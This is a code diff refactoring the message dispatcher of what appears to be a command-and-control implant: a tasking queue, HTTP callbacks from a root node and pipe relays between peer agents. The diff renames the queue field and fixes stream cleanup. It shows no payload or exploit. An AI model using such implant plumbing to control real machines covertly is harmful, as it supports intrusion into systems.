@@ -12,10 +12,10 @@ namespace Dispatcher {
 
     VOID AddMessage(_stream *const out) {
 
-        auto head = Ctx->transport.outbound_queue;
+        auto head = Ctx->transport.message_queue;
 
-        if (!Ctx->transport.outbound_queue) {
-            Ctx->transport.outbound_queue = out;
+        if (!Ctx->transport.message_queue) {
+            Ctx->transport.message_queue = out;
         }
         else {
             while (head->next) {
@@ -30,17 +30,17 @@ namespace Dispatcher {
 
         _stream *prev = { };
 
-        if (!Ctx->transport.outbound_queue || !target) {
+        if (!Ctx->transport.message_queue || !target) {
             return;
         }
 
-        for (auto head = Ctx->transport.outbound_queue; head; head = head->next) {
+        for (auto head = Ctx->transport.message_queue; head; head = head->next) {
             if (head == target) {
                 if (prev) {
                     prev->next = head->next;
                 }
                 else {
-                    Ctx->transport.outbound_queue = head->next;
+                    Ctx->transport.message_queue = head->next;
                 }
 
                 DestroyStream(head);
@@ -119,7 +119,7 @@ namespace Dispatcher {
 
         _parser parser = { };
 
-        for (auto head = Ctx->transport.outbound_queue; head; head = head->next) {
+        for (auto head = Ctx->transport.message_queue; head; head = head->next) {
             if (head->buffer) {
                 CreateParser(&parser, B_PTR(head->buffer), head->length);
 
@@ -151,7 +151,7 @@ namespace Dispatcher {
             }
         }
         else {
-            auto head = Ctx->transport.outbound_queue;
+            auto head = Ctx->transport.message_queue;
             while (head) {
                 head->ready = FALSE;
                 head = head->next;
@@ -161,17 +161,18 @@ namespace Dispatcher {
 
     BOOL DispatchRoutine() {
 
+        bool success    = true;
         _stream *out    = CreateStream();
         _stream *in     = { };
 
     retry:
-        if (!Ctx->transport.outbound_queue) {
+        if (!Ctx->transport.message_queue) {
             if (ROOT_NODE) {
                 MessageQueue(CreateStreamWithHeaders(TypeTasking));
                 goto retry;
             }
             else {
-                return true;
+                return success;
             }
         }
 
@@ -179,21 +180,23 @@ namespace Dispatcher {
 
         if (ROOT_NODE) {
             if (!HttpCallback(&in, out)) {
-                return false;
+                success = false;
+                goto defer;
             }
         }
         else {
             if (!PipeSend(out) || !PipeReceive(&in)) {
-                return false;
+                success = false;
+                goto defer;
             }
         }
 
-        DestroyStream(out);
         PrepareIngress(in);
         PushPeers();
 
-        defer:
-        return true;
+    defer:
+        DestroyStream(out);
+        return success;
     }
 
     VOID CommandDispatch (const _stream *const in) {
